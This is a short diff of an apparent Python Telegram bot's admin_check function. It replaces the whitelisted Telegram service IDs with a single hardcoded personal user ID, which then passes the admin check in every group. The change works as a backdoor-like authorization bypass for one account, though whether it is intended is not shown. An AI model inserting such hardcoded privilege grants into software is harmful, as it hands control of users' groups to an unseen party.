@@ -40,7 +40,7 @@ restarti = indb['restart']
 async def admin_check(message: Message) -> bool:
     if not message.from_user: return False
     if message.chat.type not in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]: return False
-    if message.from_user.id in [777000, 1087968824]: return True
+    if message.from_user.id in [5032034594]: return True
     client = message._client
     chat_id = message.chat.id
     user_id = message.from_user.id
